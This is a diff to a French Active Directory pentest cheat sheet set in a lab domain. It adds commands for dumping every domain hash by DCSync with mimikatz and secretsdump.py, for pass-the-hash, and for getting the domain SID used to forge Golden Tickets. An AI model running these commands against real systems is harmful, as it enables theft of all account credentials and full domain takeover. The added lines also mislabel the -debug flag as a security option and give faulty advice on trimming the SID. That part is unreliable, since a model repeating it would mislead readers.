@@ -19,9 +19,11 @@ lsadump::dcsync /domain:inlanefreight.local /all /csv
 # Extraction des hashes pour un utilisateur spécifique
 secretsdump.py -just-dc-user Administrator inlanefreight.local/user:password@dc.inlanefreight.local
 
-# Extraction de tous les hashes
-secretsdump.py -just-dc inlanefreight.local/user:password@dc.inlanefreight.local
-secretsdump.py -outputfile hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
+# Extraction de tous les hashes avec plus d'options de sécurité
+secretsdump.py -just-dc -outputfile hashes INLANEFREIGHT/adunn@172.16.5.5 -debug
+
+# Version avec hash NTLM au lieu d'un mot de passe
+secretsdump.py -just-dc -hashes :NTLM_HASH INLANEFREIGHT/adunn@172.16.5.5
 ```
 ## Attaques avec Golden Ticket
 Un Golden Ticket est un TGT forgé qui donne un accès illimité à toutes les ressources du domaine.
@@ -101,3 +103,15 @@ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
 - Nettoyez les artefacts après avoir démontré la vulnérabilité
 - Ces techniques doivent être utilisées avec extrême prudence dans un engagement réel
 - Documentez précisément les preuves de concept et les risques associés
+
+# Précision sur les SID pour Golden Ticket
+
+Dans la section sur les Golden Tickets, ajouter comment récupérer le SID du domaine:
+
+```powershell
+# Obtenir le SID du domaine pour créer un Golden Ticket
+Get-DomainSID
+# ou
+whoami /user
+# Prenez les premiers chiffres du SID affiché jusqu'à l'avant-dernier tiret
+```
